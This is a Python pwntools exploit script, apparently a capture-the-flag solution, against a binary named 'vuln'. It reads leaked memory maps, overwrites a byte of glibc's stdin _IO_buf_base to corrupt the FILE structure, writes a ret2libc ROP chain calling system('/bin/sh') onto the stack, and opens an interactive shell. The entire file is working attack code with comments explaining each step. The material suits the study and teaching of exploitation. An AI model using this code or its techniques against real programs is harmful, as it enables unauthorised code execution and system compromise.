from pwn import *

context.update(os="linux", arch="amd64")
elf = context.binary = ELF("vuln")
libc = ELF("libc.so.6")
ld = ELF("ld-linux-x86-64.so.2")

if args.REMOTE:
	p = remote("127.0.0.1", 5000)
else:
	p = elf.process()

if args.GDB:
	gdb.attach(p, gdbscript="")
	pause()

# receiving the leaks
proc_maps = p.recvuntil(b"Here is an extra: ", drop = True).strip()
proc_maps = proc_maps.splitlines()
main_rbp = int(p.recvline().strip(), 16) + 0x10

# parsing /proc/<pid>/maps content to find memory addresses
for line in proc_maps:
	if b"libc.so.6" in line:
		libc.address = int(line.split(b"-")[0], 16)
		break
for line in proc_maps:
	if b"ld-linux-x86-64.so.2" in line:
		ld.address = int(line.split(b"-")[0], 16)
		break
for line in proc_maps:
	if line.endswith(b"/vuln"):
		elf.address = int(line.split(b"-")[0], 16)
		break

log.success("binary @ " + hex(elf.address))
log.success("libc @ " + hex(libc.address))
log.success("ld @ " + hex(ld.address))
log.success("main_rbp = " + hex(main_rbp))

stdin = libc.sym["_IO_2_1_stdin_"]

# writing into the second least significant byte of stdin->_IO_buf_base
p.sendlineafter(b"Where: ", str(stdin + 0x38 + 1).encode())

# The byte that we want to write.
# (By looking at libc offsets we can see that writing this
# will move _IO_buf_base before the beginning of stdin FILE struct)
write_byte = (stdin >> 8) & 0xff

# Where _IO_buf_base will point to after our overwrite.
# (i.e. where payload1 will be written to).
# (stdin + 0x83) is the address of stdin->_short_buf, which is the
# initial value of stdin->_IO_buf_base.
write_begin = ((stdin + 0x83) & 0xffffffffffff00ff) | (write_byte << 8)

# The length of payload1
payload1_expected_length = 0x48 + (stdin - write_begin)

payload1 = b"\0" * (stdin - write_begin)	# padding until we reach the beginning of stdin FILE struct
payload1 += p64(0xfbad2088)	# _flags => just keeping them the same as what they are
payload1 += p64(stdin)	# _IO_read_ptr => Needs to point to some readable location (because _IO_file_underflow will dereference it and return the byte there).
# _IO_read_end will be increased by payload1_expected_length after the read() syscall, and
# we want it to point to somewhere before or equal to _IO_read_ptr after we are done, so that
# getchar() will call the read() syscall again next time.
payload1 += p64(stdin - payload1_expected_length)	# _IO_read_end
payload1 += p64(stdin) * 4	# Setting other pointers to the same value just in case.
payload1 += p64(main_rbp - 0x28)	# _IO_buf_base => where the return address of second getchar() is expected to be
payload1 += p64(main_rbp + 0x1000)	# _IO_buf_end => Somewhere far after _IO_buf_base so we have enough space for our ROP chain.
assert(len(payload1) == payload1_expected_length)

p.sendafter(b"What: ", bytes([write_byte]) + payload1)

# simple ret2libc ROP to be written on the return address of getchar() after the second getchar() is called.
ropgen = ROP(elfs=[elf, libc])
payload2 = p64(ropgen.find_gadget(["pop rdi", "ret"]).address)
payload2 += p64(next(libc.search(b"/bin/sh\0")))
payload2 += p64(ropgen.find_gadget(["ret"]).address)
payload2 += p64(libc.sym["system"])

p.sendafter(b"exit)", payload2)

p.interactive()
